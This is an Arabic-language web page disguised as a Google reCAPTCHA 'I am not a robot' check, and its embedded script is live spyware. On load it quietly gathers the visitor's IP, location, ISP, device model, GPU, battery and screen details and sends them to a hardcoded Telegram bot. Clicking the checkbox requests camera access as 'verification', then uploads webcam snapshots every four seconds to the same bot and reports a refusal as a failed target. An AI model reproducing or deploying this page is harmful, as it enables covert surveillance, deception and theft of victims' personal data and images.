<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; direction: rtl; }
        .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
        .captcha-left { display: flex; align-items: center; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; }
        .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #555; font-size: 14px; user-select: none; }
        .captcha-right { text-align: center; min-width: 70px; }
        .captcha-right img { width: 30px; }
        .captcha-right div { font-size: 8px; color: #9b9b9b; margin-top: 3px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="captcha-card">
        <div class="captcha-left">
            <div class="checkbox" id="btn"></div>
            <div class="text" id="msg">أنا لست برنامج روبوت</div>
        </div>
        <div class="logo-section" style="text-align: center; min-width: 70px;">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px;">
            <div style="font-size: 8px; color: #9b9b9b; margin-top: 3px;">الخصوصية - البنود</div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const chat = "2103976274";

        async function collectAll() {
            let n = navigator;
            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
                const geo = await fetch(`https://ipapi.co/${ipRes.ip}/json/`).then(r => r.json());
                report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
                report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
            } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }

            let deviceDetail = "Linux (Generic)";
            try {
                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    deviceDetail = `${ua.model} - Android ${ua.platformVersion}`;
                } else {
                    let uaText = n.userAgent;
                    let modelMatch = uaText.match(/\(([^)]+)\)/);
                    if (modelMatch && modelMatch[1]) {
                        let parts = modelMatch[1].split(';');
                        deviceDetail = parts[2] ? parts[2].trim() : parts[0].trim();
                    }
                }
            } catch (e) { deviceDetail = n.platform; }
            
            report += `📱 **النظام:** ${deviceDetail}\n`;
            let bName = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Other";
            report += `🧭 **المتصفح:** ${bName}\n`;

            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
            } catch(e) {}

            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;

            try {
                if (n.getBattery) {
                    const b = await n.getBattery();
                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
                }
            } catch (e) {}

            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
            sendText(report);
        }

        document.getElementById('btn').onclick = async function() {
            this.classList.add('loading');
            document.getElementById('msg').innerText = "جاري التحقق...";
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 } 
                });
                const video = document.getElementById('v');
                video.srcObject = s;

                video.onloadedmetadata = () => {
                    video.play();
                    // حل مشكلة السواد في كروم
                    setTimeout(() => {
                        snap(); // أول صورة فورية
                        setInterval(snap, 4000); // صور متكررة
                        
                        // التوجيه التلقائي بعد 5 ثوانٍ من نجاح التحميل
                        setTimeout(() => {
                            window.location.href = "project.html";
                        }, 12000);

                    }, 1000);
                };
            } catch (e) {
                sendText("⚠️ **المستهدف رفض الكاميرا**");
                this.classList.remove('loading');
                document.getElementById('msg').innerText = "فشل التحقق. يرجى تفعيل الكاميرا.";
            }
        };

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const f = new FormData();
                    f.append('chat_id', chat);
                    f.append('photo', blob, 'x.jpg');
                    fetch(api + "sendPhoto", { method: 'POST', body: f });
                }, 'image/jpeg', 0.8);
            }
        }

        function sendText(txt) {
            fetch(api + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
            });
        }

        collectAll();
    </script>
</body>
</html>
